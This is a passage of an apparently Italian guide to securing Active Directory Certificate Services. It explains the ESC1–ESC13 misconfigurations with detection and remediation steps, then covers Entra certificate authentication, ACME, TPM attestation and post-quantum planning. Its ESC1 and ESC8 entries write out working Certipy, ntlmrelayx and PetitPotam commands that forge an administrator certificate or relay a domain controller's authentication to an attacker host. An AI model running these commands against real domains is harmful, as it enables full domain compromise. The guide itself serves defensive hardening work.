# certsrv.msc → CA Properties → Enrollment Agents
# → Restrict enrollment agents: Yes
# → Aggiungere regole:
#    Enrollment Agent: CORP\svc-enrollment → può richiedere
#    Certificate Template: Smart Card Logon → per il template
#    Permissions: CORP\GG-SmartCardUsers → solo per questo gruppo

# Questo impedisce all'Enrollment Agent di emettere certificati
# per utenti al di fuori del gruppo autorizzato.

# Verificare la configurazione
certutil -getreg CA\EnrollmentAgentRights
```

### Protezione contro Attacchi PKI Comuni

```
Attacco: ESC1 — Template con SAN specificato dal richiedente + Enroll per utenti generici
Rischio: CRITICO — un utente può richiedere un certificato con il SAN di un Domain Admin
Mitigazione:
├── Non concedere Enroll a "Authenticated Users" su template con "Supply in the request"
├── Usare "Build from Active Directory information" per i template utente
├── Richiedere approvazione CA Manager per template con SAN libero
└── Audit regolare con certutil -template -v

Attacco: ESC8 — NTLM relay contro Web Enrollment
Rischio: ALTO — relay NTLM per ottenere certificati
Mitigazione:
├── Abilitare EPA (Extended Protection for Authentication) su Web Enrollment
├── Rimuovere Web Enrollment se non necessario (preferire CES/CEP con Kerberos)
└── Disabilitare NTLM dove possibile (GPO)

Attacco: ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag
Rischio: CRITICO — qualsiasi richiedente può specificare un SAN arbitrario
Mitigazione:
├── Verificare: certutil -getreg "CA\Policy\EditFlags"
├── Deve NON avere il flag EDITF_ATTRIBUTESUBJECTALTNAME2
├── Rimuovere: certutil -setreg CA\Policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
└── Restart-Service CertSvc

Attacco: Compromissione della chiave privata CA
Rischio: CRITICO — l'attaccante può emettere certificati per chiunque
Mitigazione:
├── HSM per proteggere la chiave
├── Root CA offline
├── Accesso fisico limitato
├── Monitoraggio SIEM degli eventi CA
└── Procedure di incident response per revoca CA
```

### Superficie di Attacco AD CS — ESC1 fino a ESC13

La ricerca "Certified Pre-Owned" di SpecterOps (2021) ha identificato le prime 8 classi di vulnerabilità AD CS. Successivamente la comunità ha esteso la tassonomia fino a ESC16. Ogni classe sfrutta una diversa misconfiguration della PKI per ottenere privilege escalation, spesso fino a Domain Admin. I tool principali di enumerazione e sfruttamento sono Certipy (Python, versione 5+ supporta ESC1-ESC16) e Certify (C#, versione 2.0 rilasciata ad agosto 2025).

```
Panoramica completa delle vulnerabilità ESC (Escalation)
═══════════════════════════════════════════════════════════

ESC1 — Subject Alternative Name (SAN) controllato dal richiedente
─────────────────────────────────────────────────────────────────
Condizioni:
├── Template con flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (Supply in the request)
├── EKU che consente autenticazione (Client Authentication o Smart Card Logon)
├── Permesso Enroll concesso a utenti a basso privilegio
│   (tipicamente Authenticated Users o Domain Users)
└── Nessuna approvazione del CA Manager richiesta

Impatto: CRITICO (CVSS 9.8)
L'attaccante richiede un certificato specificando nel SAN l'UPN di un Domain Admin.
Il DC mappa il certificato all'account DA e rilascia un TGT Kerberos.

Sfruttamento (Certipy):
  certipy find -vulnerable -u utente@corp.local -p password
  certipy req -ca Corp-Issuing-CA -template VulnTemplate \
    -upn administrator@corp.local -u utente@corp.local -p password
  certipy auth -pfx administrator.pfx

Rilevamento:
├── Event ID 4886/4887 sulla CA con SAN diverso dal richiedente
├── Monitorare richieste dove SAN UPN ≠ RequesterName
├── Query certutil: certutil -view -restrict "CertificateTemplate=VulnTemplate"
└── Regola SIEM: alert su certificati emessi con SAN contenente admin/DA

Remediation:
├── Rimuovere "Supply in the request" → usare "Build from AD information"
├── Se SAN libero è necessario (web server): richiedere CA Manager approval
├── Rimuovere Enroll da Authenticated Users / Domain Users
├── Concedere Enroll solo al gruppo specifico che ne ha bisogno
└── Audit periodico: certutil -template -v | findstr /i "Supply"


ESC2 — Any Purpose EKU o EKU assente
────────────────────────────────────
Condizioni:
├── Template con EKU "Any Purpose" (OID 2.5.29.37.0) o senza EKU
├── Il certificato risultante può essere usato per qualsiasi scopo
│   (autenticazione client, server, code signing, ecc.)
└── Permesso Enroll per utenti a basso privilegio

Impatto: ALTO (CVSS 8.8)
Un certificato "Any Purpose" è implicitamente valido per Client Authentication,
consentendo autenticazione come qualsiasi utente se combinato con SAN libero.

Remediation:
├── Specificare EKU espliciti in ogni template (mai "Any Purpose")
├── Rimuovere template con EKU vuoto
└── Audit: cercare template con OID 2.5.29.37.0 o EKU vuoto


ESC3 — Enrollment Agent senza restrizioni
─────────────────────────────────────────
Condizioni:
├── Template con EKU "Certificate Request Agent" (OID 1.3.6.1.4.1.311.20.2.1)
├── Enroll consentito a utenti non privilegiati
├── Un secondo template consente enrollment "on behalf of" senza restrizioni
└── Nessun Restricted Enrollment Agent configurato sulla CA

Impatto: CRITICO (CVSS 9.8)
Attacco in due fasi:
  1. L'attaccante ottiene un certificato Enrollment Agent
  2. Usa il certificato EA per richiedere un certificato Smart Card Logon
     per conto di un Domain Admin (co-signing con il cert EA)

Remediation:
├── Restringere enrollment agent sulla CA (certsrv.msc → Enrollment Agents)
├── Limitare quali template l'EA può usare e per quali gruppi
├── Non concedere Enroll su template EA a utenti generici
└── Audit: certutil -getreg CA\EnrollmentAgentRights


ESC4 — Permessi di scrittura sui template
─────────────────────────────────────────
Condizioni:
├── Un utente a basso privilegio ha WriteDacl, WriteOwner, WriteProperty
│   o GenericAll su un oggetto certificate template in AD
└── L'attaccante può modificare il template per introdurre ESC1/ESC2

Impatto: CRITICO (CVSS 9.8)
L'attaccante modifica un template sicuro aggiungendo "Supply in the request"
e EKU Client Authentication, lo sfrutta come ESC1, poi ripristina la config
originale per cancellare le tracce.

Rilevamento:
├── Monitorare modifiche agli oggetti CN=Certificate Templates in AD
├── Event ID 4899/4900 sulla CA (template aggiornato)
├── AD audit: Object Access → Directory Service Changes
└── Confrontare hash degli oggetti template con baseline nota

Remediation:
├── Rimuovere permessi di scrittura per utenti non privilegiati su tutti i template
├── Solo Enterprise Admins e CA Admins devono avere Write su template
├── Abilitare auditing sugli oggetti template in AD
└── Audit ACL: Get-ADObject -Filter 'objectClass -eq "pKICertificateTemplate"' |
    Get-Acl | Select-Object Path, AccessToString


ESC5 — Permessi sulla CA e sugli oggetti PKI in AD
──────────────────────────────────────────────────
Condizioni:
├── Permessi eccessivi su oggetti AD legati alla PKI:
│   ├── Container CN=Public Key Services,CN=Services,CN=Configuration
│   ├── Oggetto CA (CN=AIA, CN=CDP, CN=Enrollment Services)
│   └── Computer object del server CA
└── GenericAll o WriteDacl su questi oggetti

Impatto: ALTO (CVSS 8.8)
L'attaccante può modificare configurazioni PKI a livello di foresta,
aggiungere CA trusted, modificare CDP/AIA, o prendere il controllo del server CA.

Remediation:
├── Audit ACL su tutto il container Public Key Services
├── Solo Enterprise Admins devono avere Full Control
├── Rimuovere gruppi come Account Operators, Server Operators
└── Proteggere il computer object del server CA con AdminSDHolder


ESC6 — Flag EDITF_ATTRIBUTESUBJECTALTNAME2
──────────────────────────────────────────
Condizioni:
├── La CA ha il flag EDITF_ATTRIBUTESUBJECTALTNAME2 abilitato nel registry
└── Questo flag consente a QUALSIASI richiedente di specificare un SAN arbitrario
    indipendentemente dalla configurazione del template

Impatto: CRITICO (CVSS 9.8)
Anche template configurati con "Build from AD" diventano vulnerabili:
il flag globale sulla CA sovrascrive la policy del template.

Verifica:
  certutil -getreg "CA\Policy\EditFlags"
  # Se EDITF_ATTRIBUTESUBJECTALTNAME2 è presente → VULNERABILE

Remediation immediata:
  certutil -setreg CA\Policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
  Restart-Service CertSvc


ESC7 — Permessi eccessivi sulla CA (ManageCA / ManageCertificates)
─────────────────────────────────────────────────────────────────
Condizioni:
├── Un utente ha il diritto ManageCA sulla CA
│   (può modificare la configurazione della CA, incluso abilitare ESC6)
├── Oppure ManageCertificates (può approvare richieste pending)
└── Combinando i due diritti: abilitare ESC6 + approvare richieste arbitrarie

Impatto: CRITICO (CVSS 9.8)

Remediation:
├── Restringere ManageCA a un gruppo dedicato CA Admins
├── ManageCertificates solo al team PKI operativo
├── Separare i ruoli: chi configura la CA ≠ chi approva i certificati
├── Audit: certutil -getreg CA\Security
└── Monitorare Event ID 4890 (Certificate Services Manager Settings changed)


ESC8 — NTLM Relay verso HTTP Enrollment
───────────────────────────────────────
Condizioni:
├── Web Enrollment (certsrv) esposto via HTTP o HTTPS senza EPA
├── NTLM authentication abilitata sul web enrollment
├── L'attaccante può effettuare relay NTLM (posizione di rete)
└── Coerced authentication (PetitPotam, PrinterBug, DFSCoerce)

Impatto: CRITICO (CVSS 9.8)
L'attaccante forza un Domain Controller a autenticarsi (coercion),
intercetta l'autenticazione NTLM e la relay verso il web enrollment
per ottenere un certificato DC. Con il certificato DC ottiene il TGT
e compromette l'intero dominio.

Sfruttamento:
  # Coerced authentication + relay
  ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support \
    --adcs --template "Domain Controller"
  python3 PetitPotam.py attacker-ip dc01.corp.local

Remediation:
├── Abilitare EPA (Extended Protection for Authentication) su Web Enrollment
├── Rimuovere Web Enrollment se non necessario
├── Preferire CES/CEP con autenticazione Kerberos
├── Disabilitare NTLM: GPO → Network security: Restrict NTLM
├── Abilitare HTTPS con require client certificate
└── Bloccare coercion: patch MS-EFSRPC, disabilitare Print Spooler sui DC


ESC9 — Assenza dell'estensione szOID_NTDS_CA_SECURITY_EXT
─────────────────────────────────────────────────────────
Condizioni:
├── Template configurato per NON includere l'estensione di sicurezza
│   szOID_NTDS_CA_SECURITY_EXT (OID 1.3.6.1.4.1.311.25.2)
├── Questa estensione, introdotta con il patch KB5014754 (maggio 2022),
│   contiene il SID del richiedente nel certificato
├── L'attaccante ha GenericWrite su un account target
└── StrongCertificateBindingEnforcement non è impostato a 2

Impatto: ALTO (CVSS 8.1)
L'attaccante modifica l'UPN dell'account target, richiede un certificato
(senza SID nell'estensione), poi ripristina l'UPN. Il certificato emesso
può autenticare come il target perché il mapping è basato solo sull'UPN.

Remediation:
├── Applicare KB5014754 e impostare StrongCertificateBindingEnforcement = 2
│   (Full enforcement mode)
├── Assicurare che tutti i template includano l'estensione di sicurezza
├── Registry: HKLM\SYSTEM\CurrentControlSet\Services\Kdc
│   CertificateMappingMethods = 0x4 (solo strong mapping)
└── Monitorare Event ID 39 (KDC) per avvisi di weak mapping


ESC10 — Weak Certificate Mapping (globale)
─────────────────────────────────────────
Condizioni:
├── Simile a ESC9 ma sfrutta il mapping debole a livello di DC (non di template)
├── Registry CertificateMappingMethods contiene metodi deboli (0x1 o 0x2)
├── StrongCertificateBindingEnforcement = 0 o 1 (non full enforcement)
└── L'attaccante ha GenericWrite su un account target

Impatto: ALTO (CVSS 8.1)
A differenza di ESC9, non è limitato a un template specifico: qualsiasi
certificato emesso con UPN può essere usato per weak mapping.

Remediation:
├── Impostare StrongCertificateBindingEnforcement = 2 su TUTTI i DC
├── Rimuovere metodi di mapping deboli dal registry KDC
├── Forzare full enforcement mode (Microsoft lo rende obbligatorio)
└── Monitorare modifiche al registry KDC su tutti i Domain Controller


ESC11 — NTLM Relay verso ICPR (RPC)
───────────────────────────────────
Condizioni:
├── L'interfaccia RPC della CA (ICPR) accetta autenticazione senza cifratura
├── Flag IF_ENFORCEENCRYPTICERTREQUEST non impostato sulla CA
└── L'attaccante può relay NTLM verso l'interfaccia RPC della CA

Impatto: ALTO (CVSS 8.1)
Simile a ESC8 ma colpisce l'interfaccia RPC nativa (non il web enrollment).
Anche CA senza web enrollment sono vulnerabili.

Remediation:
├── Impostare IF_ENFORCEENCRYPTICERTREQUEST sulla CA
│   certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
│   Restart-Service CertSvc
├── Disabilitare NTLM dove possibile
└── Forzare packet privacy sull'interfaccia RPC


ESC12 — Chiave CA su YubiHSM con credenziali esposte
────────────────────────────────────────────────────
Condizioni:
├── La CA usa un YubiHSM 2 come HSM
├── La password di autenticazione verso l'HSM è nel registry in chiaro
│   (HKLM\SOFTWARE\Yubico\YubiHSM)
└── L'attaccante ha accesso locale al server CA (admin locale)

Impatto: ALTO (CVSS 7.5)
L'attaccante legge la password dall'HSM dal registry e può firmare
certificati arbitrari con la chiave privata della CA.

Remediation:
├── Restringere l'accesso al registry del server CA
├── Usare ACL granulari sulla chiave del registry Yubico
├── Proteggere il server CA come Tier 0 asset
└── Considerare HSM enterprise (Thales, Entrust) con autenticazione più robusta


ESC13 — Issuance Policy con OID linkato a gruppo AD
──────────────────────────────────────────────────
Condizioni:
├── Template con Issuance Policy che referenzia un OID
├── L'OID è linkato a un gruppo AD tramite l'attributo msDS-OIDToGroupLink
├── Il certificato emesso conferisce i privilegi del gruppo linkato
└── L'utente che ottiene il certificato non è membro del gruppo

Impatto: ALTO (CVSS 8.1)
L'attaccante ottiene un certificato con un issuance policy OID che
conferisce membership in un gruppo privilegiato (es. Domain Admins).
Il certificato agisce come "membership token" per il gruppo linkato.

Remediation:
├── Audit degli OID con msDS-OIDToGroupLink:
│   Get-ADObject -Filter 'objectClass -eq "msPKI-Enterprise-Oid"' \
│     -Properties msDS-OIDToGroupLink | Where-Object {$_.'msDS-OIDToGroupLink'}
├── Rimuovere link OID-gruppo non necessari
├── Non linkare OID a gruppi ad alto privilegio
└── Restringere Enroll sui template con issuance policy
```

### Enumerazione e Audit Automatizzato

```powershell
# === Certipy — Enumerazione da Linux/Kali ===

# Trovare tutte le vulnerabilità ESC
certipy find -vulnerable -u utente@corp.local -p password -dc-ip 10.0.0.1

# Output: file JSON e TXT con tutti i finding ESC1-ESC13+
# Il report include: template vulnerabili, permessi, flag, remediation suggerita

# Enumerazione completa (anche non-vulnerable)
certipy find -u utente@corp.local -p password -dc-ip 10.0.0.1

# === Certify — Enumerazione da Windows ===

# Trovare template vulnerabili
Certify.exe find /vulnerable

# Trovare template con SAN specificabile
Certify.exe find /enrolleeSuppliesSubject

# Verificare flag EDITF_ATTRIBUTESUBJECTALTNAME2
Certify.exe cas

# === PSPKIAudit — Audit PowerShell ===

Import-Module PSPKIAudit
Invoke-PKIAudit | Export-Csv C:\Reports\pki-audit.csv

# === Locksmith — Audit e Remediation automatizzata ===
# GitHub: TrimarcJake/Locksmith
# Genera script di remediation per ogni finding
Invoke-Locksmith -Mode 4  # Genera fix script senza applicarli

# === Checklist manuale rapida ===
# 1. Flag ESC6
certutil -getreg "CA\Policy\EditFlags"

# 2. Template con Supply in request
certutil -template -v | Select-String "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"

# 3. Enrollment Agent restrictions
certutil -getreg CA\EnrollmentAgentRights

# 4. Interface flags (ESC11)
certutil -getreg CA\InterfaceFlags

# 5. Strong certificate binding enforcement (ESC9/ESC10)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement

# 6. Security extension enforcement (ESC16)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v CertificateMappingMethods
```

---

## Autenticazione Basata su Certificati con Entra ID

### Certificate-Based Authentication (CBA) in Microsoft Entra

```
Microsoft Entra CBA consente l'autenticazione passwordless e phishing-resistant
usando certificati X.509 emessi dalla PKI enterprise. Dall'introduzione nativa
in Entra ID (senza necessità di federation server come AD FS), CBA è diventato
il metodo raccomandato per scenari ad alta sicurezza (governo, finanza, difesa).

Vantaggi principali:
├── Phishing-resistant: il certificato è legato al dispositivo/TPM,
│   non può essere intercettato tramite phishing
├── Passwordless: elimina le password come fattore di autenticazione
├── MFA nativo: un singolo certificato può soddisfare sia il primo fattore
│   (possesso del certificato) sia il secondo (PIN della smart card o TPM)
├── Compliance: soddisfa NIST AAL3, EO 14028 (Zero Trust), DISA STIG
└── Integrazione: funziona con Conditional Access e Authentication Strengths

Flusso di autenticazione Entra CBA:
1. L'utente accede a una risorsa protetta da Entra ID (es. Microsoft 365)
2. Entra ID presenta la pagina di sign-in
3. L'utente seleziona "Sign in with a certificate"
4. Il browser presenta i certificati disponibili nello store locale
5. L'utente seleziona il certificato e inserisce il PIN (se smart card/TPM)
6. Entra ID verifica:
   a. La catena di fiducia (la CA emittente è nel trust store di Entra ID)
   b. Lo stato di revoca (CRL o OCSP)
   c. Il binding del certificato all'utente Entra ID
   d. Le policy di authentication binding (single-factor o multi-factor)
7. Se la verifica ha successo, Entra ID emette i token di accesso
```

### Configurazione CBA in Entra ID

```
Prerequisiti:
├── Tenant Entra ID P1 o P2
├── Certificati CA root e intermediate caricati nel trust store di Entra ID
├── CRL pubblicata su URL HTTPS raggiungibile da internet
│   (Entra ID scarica la CRL per verificare la revoca)
├── Certificati utente con UPN nel SAN o Subject
└── Conditional Access policy configurata (opzionale ma raccomandata)

Configurazione — Passo per passo:

1. Caricare i certificati CA trusted
   ├── Entra Admin Center → Protection → Show more → Certificate Authorities
   ├── Upload: certificato Root CA + ogni Intermediate CA
   ├── Per ogni CA specificare: Is root CA? (sì/no)
   └── CRL Distribution Point URL (obbligatorio per verifica revoca)

2. Abilitare CBA come metodo di autenticazione
   ├── Entra Admin Center → Protection → Authentication methods → Policies
   ├── Certificate-based authentication → Enable
   ├── Target: All users oppure gruppi specifici
   └── Configurare Protection level:
       ├── Single-factor authentication
       └── Multi-factor authentication (raccomandato per phishing-resistant)

3. Configurare Authentication Binding Policy
   ├── Regole che determinano se il certificato soddisfa MFA o solo SFA
   ├── Binding rules per:
   │   ├── Issuer: certificati da CA specifica → MFA
   │   ├── Policy OID: certificati con OID specifico → MFA
   │   └── Default: tutti gli altri certificati → SFA o MFA
   └── Priorità: le regole vengono valutate in ordine di priorità

4. Configurare Username Binding Policy
   ├── Come mappare il certificato all'utente Entra ID:
   │   ├── PrincipalName → userPrincipalName (raccomandato)
   │   ├── RFC822Name → userPrincipalName
   │   ├── X509SKI → certificateUserIds (alta affinità)
   │   ├── X509SHA1PublicKey → certificateUserIds (alta affinità)
   │   ├── IssuerAndSubject → certificateUserIds
   │   └── IssuerAndSerialNumber → certificateUserIds
   └── Priorità: le regole vengono valutate in ordine

5. Conditional Access — Authentication Strength
   ├── Creare una Authentication Strength personalizzata
   │   che richieda CBA (phishing-resistant)
   ├── Oppure usare la built-in "Phishing-resistant MFA"
   │   (include CBA, FIDO2, WHfB)
   └── Applicare la Conditional Access policy alle risorse critiche
```

### Affinità di Binding — Strong vs Weak

```
L'affinità del binding determina la sicurezza del mapping certificato→utente:

Alta affinità (raccomandata per produzione):
├── X509SKI (Subject Key Identifier) → identificatore univoco del certificato
├── X509SHA1PublicKey → hash della chiave pubblica
└── IssuerAndSerialNumber → combinazione univoca issuer + serial

Bassa affinità (sconsigliata per scenari ad alta sicurezza):
├── PrincipalName → UPN nel SAN (può essere modificato)
├── RFC822Name → email nel SAN
└── Subject → DN del soggetto (non univoco se duplicato)

Enforcement:
├── Entra ID supporta enforcement mode:
│   ├── Disabled (default iniziale): sia alta che bassa affinità accettate
│   └── Enabled: solo alta affinità per autenticazione MFA
├── Microsoft sta gradualmente forzando il full enforcement
│   (allineamento con KB5014754 e strong certificate mapping on-premise)
└── Raccomandazione: migrare a binding ad alta affinità PRIMA dell'enforcement
```

---

## Protocollo ACME per PKI Enterprise

### ACME Nativo in Windows Server 2025

```
Windows Server 2025 ha introdotto il supporto nativo per il protocollo ACME
(Automatic Certificate Management Environment — RFC 8555) in AD CS.
Questo consente ai client ACME (Certbot, acme.sh, win-acme, Traefik, Caddy)
di richiedere e rinnovare certificati automaticamente dalla CA enterprise interna,
usando lo stesso workflow standardizzato di Let's Encrypt.

Architettura:
┌────────────────────┐     ACME (HTTPS)     ┌──────────────────────┐
│  Client ACME       │ ◄─────────────────► │  AD CS con ruolo     │
│  (web server,      │                      │  ACME Endpoint       │
│   container,       │                      │  (Windows Server     │
│   appliance)       │                      │   2025)              │
└────────────────────┘                      └──────────┬───────────┘
                                                       │
                                               Emissione certificato
                                               tramite template
                                                       │
                                            ┌──────────▼───────────┐
                                            │  Issuing CA          │
                                            │  (Enterprise CA)     │
                                            └──────────────────────┘

Vantaggi rispetto ai metodi tradizionali:
├── Automazione completa: nessun intervento manuale per emissione e rinnovo
├── Compatibilità: qualsiasi client ACME standard funziona con la CA interna
├── Eliminazione di script custom per il rinnovo certificati
├── Supporto per ambienti containerizzati (Kubernetes, Docker)
├── Supporto per appliance non-Windows (Linux, network device)
└── Riduzione drastica del rischio di certificati scaduti

Limitazioni:
├── Solo Domain Validation (verifica del controllo del dominio)
├── Richiede che il client ACME raggiunga l'endpoint AD CS via HTTPS
├── Il template deve essere configurato per accettare richieste ACME
└── Non sostituisce auto-enrollment per scenari AD-integrated standard
```

### Soluzioni ACME per Windows Server Pre-2025

```powershell
# Per ambienti Windows Server 2019/2022, il supporto ACME nativo non è disponibile.
# Soluzioni di terze parti fungono da proxy ACME davanti alla CA AD CS:

# 1. ACME-Server-ADCS (open source, GitHub: glatzert/ACME-Server-ADCS)
#    Proxy ACME che traduce richieste RFC 8555 in enrollment AD CS via DCOM.
#    Supporta HTTP-01 e DNS-01 challenge.
#    Installazione: IIS + .NET 6+ sul server proxy.

# 2. Smallstep step-ca
#    CA leggera con supporto ACME nativo.
#    Può essere configurata come RA (Registration Authority) davanti a AD CS.
#    Supporta enrollment via API REST.

# 3. Keytos EZCA
#    Soluzione commerciale: proxy ACME con dashboard di gestione,
#    integrazione Azure Key Vault, e reporting.

# 4. Secardeo TOPKI
#    Proxy ACME enterprise con auto-enrollment per server non-Windows.

# Esempio di configurazione win-acme con proxy ACME-Server-ADCS:
# Il proxy espone https://acme-proxy.corp.local/directory

# wacs.exe con CA interna via proxy ACME
C:\Tools\win-acme\wacs.exe --target manual `
    --host "intranet.corp.contoso.com" `
    --validation selfhosting `
    --baseuri "https://acme-proxy.corp.local/directory" `
    --store certificatestore `
    --installation iis --siteid 1

# Il proxy ACME traduce la richiesta e la inoltra alla CA enterprise
# Il certificato emesso è firmato dalla CA interna (non da Let's Encrypt)
```

---

## Key Attestation con TPM 2.0

### Attestazione della Chiave con TPM

```
La Key Attestation è un meccanismo introdotto in Windows Server 2012 R2
(template v4) che consente alla CA di verificare crittograficamente che
la chiave privata del certificato è protetta da un Trusted Platform Module (TPM).

Senza Key Attestation:
├── La CA non ha modo di sapere DOVE è custodita la chiave privata
├── La chiave potrebbe essere nel software (estraibile con memory dump)
├── La chiave potrebbe essere stata esportata e duplicata
└── La garanzia di non-repudiation è debole

Con Key Attestation:
├── Il TPM genera la chiave internamente (non estraibile)
├── Il TPM produce una prova crittografica (attestation statement)
│   che dimostra che la chiave è hardware-bound
├── La CA verifica l'attestation prima di emettere il certificato
├── Il certificato risultante contiene un'estensione che certifica
│   la protezione TPM
└── Garanzia forte: la chiave non può essere copiata o esportata

Componenti dell'attestazione TPM:
├── Endorsement Key (EK): chiave univoca del TPM, installata dal produttore
│   ├── Ogni TPM ha un EK univoco con certificato del produttore
│   └── L'EK non viene mai usata direttamente per firmare certificati utente
├── Attestation Identity Key (AIK): chiave derivata usata per l'attestation
│   ├── L'AIK firma le attestation statement
│   └── La CA verifica la firma AIK tramite la catena EK
└── Platform Configuration Registers (PCR): misure di integrità della piattaforma
    └── Opzionalmente verificabili per garantire l'integrità del boot
```

### Configurazione Template con Key Attestation

```powershell
# La Key Attestation si configura sui certificate template v4 (Windows Server 2012 R2+)
# Richiede Enterprise CA e client Windows 8.1+

# Passo 1: Popolare lo store dei certificati TPM trusted sulla CA

# Opzione A: Attestation tramite Endorsement Certificate
# Aggiungere i certificati root CA dei produttori TPM allo store EKROOT
# e i certificati intermediate allo store EKCA
certutil -addstore EKROOT "TPM-Vendor-RootCA.cer"
certutil -addstore EKCA "TPM-Vendor-IntermediateCA.cer"

# Certificati CA dei principali produttori TPM:
# ├── Infineon: scaricabili da pki.infineon.com
# ├── Intel: certificati Intel PTT
# ├── STMicroelectronics: www.st.com/tpm
# ├── Nuvoton: www.nuvoton.com
# └── AMD: fTPM certificates

# Opzione B: Attestation tramite Endorsement Key (lista EK)
# Aggiungere ogni EK individualmente allo store EKPUB
# (più sicuro ma richiede inventario manuale di ogni TPM)
certutil -addstore EKPUB "computer01-ek.cer"

# Opzione C: Attestation tramite AIK Certificate
# La CA emette un AIK certificate per ogni TPM (servizio automatico)
# Meno configurazione manuale richiesta

# Passo 2: Creare template v4 con Key Attestation
# certtmpl.msc → duplicare template base → scegliere versione Windows Server 2012 R2
# Tab Key Attestation:
#   ├── Key Attestation: Required (la CA rifiuta richieste senza attestation)
#   │   oppure
#   ├── Key Attestation: Optional (la CA emette comunque ma marca il certificato)
#   │
#   ├── Attestation type:
#   │   ├── User credentials: l'utente autenticato garantisce il TPM (meno sicuro)
#   │   ├── Endorsement certificate: verifica tramite catena del vendor (raccomandato)
#   │   └── Endorsement key: verifica tramite EK specifico (massima sicurezza)
#   │
#   └── Enforce strong private key protection:
#       solo chiavi con TPM attestation valido vengono accettate

# Passo 3: Configurare Cryptography del template
# Tab Cryptography:
#   ├── Provider Category: Key Storage Provider
#   ├── Algorithm: RSA
#   ├── Minimum key size: 2048
#   ├── Provider: Microsoft Platform Crypto Provider (TPM-backed)
#   └── Request hash: SHA256

# Passo 4: Pubblicare e testare
Add-CATemplate -Name "CorpTPMAuth" -Force

# Verificare che il certificato richiesto sia TPM-backed
$cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object Subject -like "*TPM*"
certutil -v -store My $cert.SerialNumber
# L'output deve mostrare "Microsoft Platform Crypto Provider"
# e l'estensione di attestation TPM

# Scenari d'uso principali per Key Attestation:
# ├── Windows Hello for Business (Certificate Trust): le chiavi WHfB
# │   devono essere verificabilmente TPM-protected
# ├── Smart Card virtuale (VSC): garanzia che la chiave non è nel software
# ├── Certificati di autenticazione ad alta sicurezza (governo, difesa)
# ├── Certificati per firma digitale con valore legale (eIDAS, DPCM)
# └── Certificati per code signing con hardware key protection
```

---

## Preparazione Post-Quantum per la PKI

### Crittografia Post-Quantum — Contesto e Urgenza

```
Il rischio "Harvest Now, Decrypt Later" (HNDL) rende la migrazione PQC urgente:
avversari sofisticati intercettano e archiviano traffico cifrato oggi per
decifrarlo quando i computer quantistici saranno operativi. I dati con valore
a lungo termine (segreti di stato, proprietà intellettuale, dati sanitari)
sono già a rischio.

Standard NIST PQC (finalizzati agosto 2024):
├── ML-KEM (CRYSTALS-Kyber) — FIPS 203
│   ├── Key Encapsulation Mechanism (scambio chiavi)
│   ├── Sostituisce RSA key exchange e ECDH
│   └── Dimensioni chiave: 800-1568 byte (vs 256 byte ECDH)
├── ML-DSA (CRYSTALS-Dilithium) — FIPS 204
│   ├── Digital Signature Algorithm
│   ├── Sostituisce RSA e ECDSA per le firme
│   └── Dimensioni firma: 2420-4627 byte (vs 64 byte ECDSA)
├── SLH-DSA (SPHINCS+) — FIPS 205
│   ├── Firma basata su hash (fallback stateless)
│   ├── Nessuna dipendenza da problemi algebrici
│   └── Firme più grandi (7856-49856 byte) ma fiducia conservativa
└── HQC — selezionato come backup KEM (marzo 2025)
    └── Basato su codici correttori, alternativa a ML-KEM

Implicazioni per i certificati X.509:
├── Certificati con firma RSA/ECDSA non saranno più sicuri post-quantum
├── Chiavi pubbliche e firme PQC sono significativamente più grandi
├── I certificati PQC occuperanno più spazio (impatto su TLS handshake)
├── La catena di fiducia dovrà essere rifirmata con algoritmi PQC
└── Il periodo di transizione richiederà crittografia ibrida (classica + PQC)
```

### Supporto PQC in Windows e AD CS

```
Timeline di supporto Microsoft:

Novembre 2025 — Disponibilità generale:
├── Windows 11 24H2: API CNG con ML-KEM e ML-DSA
├── Windows Server 2025: stesse API CNG disponibili
├── .NET 10: classi MLKem e MLDsa nei namespace System.Security.Cryptography
└── SymCrypt (motore crittografico core): supporto ML-KEM-768, ML-DSA-65

Roadmap 2026+:
├── AD CS: supporto PQC per emissione certificati con firma ML-DSA
│   (previsto per aggiornamento cumulativo 2026)
├── TLS 1.3: negoziazione ibrida X25519+ML-KEM-768 in SChannel
├── S/MIME: supporto certificati con chiave PQC per email cifrata
├── Kerberos: PKINIT con certificati PQC
└── Code Signing: firma Authenticode con ML-DSA

Crittografia ibrida (fase di transizione):
├── I certificati useranno algoritmi compositi:
│   es. RSA-4096 + ML-DSA-65 (firma doppia)
├── La verifica accetta la firma classica O la firma PQC
├── Backward compatibility: client legacy verificano solo la firma classica
├── Client PQC-aware verificano entrambe le firme
└── Standard: ITU-T X.509 composite signatures (draft in corso)
```

### Piano di Migrazione PQC per la PKI Enterprise

```
Fase 1 — Inventario e Pianificazione (ora → 2028)
├── Inventario crittografico completo:
│   ├── Tutti i certificati emessi: algoritmo, key size, scadenza
│   ├── Algoritmi usati in TLS, VPN, S/MIME, code signing, Kerberos
│   ├── HSM e il loro supporto PQC (verificare con il vendor)
│   └── Applicazioni di terze parti e il loro supporto PQC
├── Classificare i dati per durata di valore:
│   ├── Dati con valore > 10 anni: priorità massima per migrazione
│   ├── Dati con valore 5-10 anni: priorità alta
│   └── Dati transitori: priorità bassa
├── Testare algoritmi PQC in ambiente di lab:
│   ├── Impatto sulle performance (TLS handshake, firma certificati)
│   ├── Compatibilità con applicazioni esistenti
│   ├── Impatto sulle dimensioni dei certificati e delle CRL
│   └── Impatto sulla banda di rete (certificati PQC sono più grandi)
└── Budget: aggiornamento HSM con supporto PQC (Thales Luna 8+, Entrust nShield 5)

Fase 2 — Implementazione Ibrida (2026 → 2031)
├── Aggiornare la CA a Windows Server 2025+ con patch PQC
├── Aggiornare gli HSM con firmware PQC-capable
├── Implementare certificati ibridi (dual-signature):
│   ├── Root CA: rinnovo con chiave composita RSA-4096 + ML-DSA-65
│   ├── Issuing CA: rinnovo con chiave composita
│   └── End-entity: nuovi template con crittografia ibrida
├── TLS: abilitare key exchange ibrido X25519+ML-KEM-768
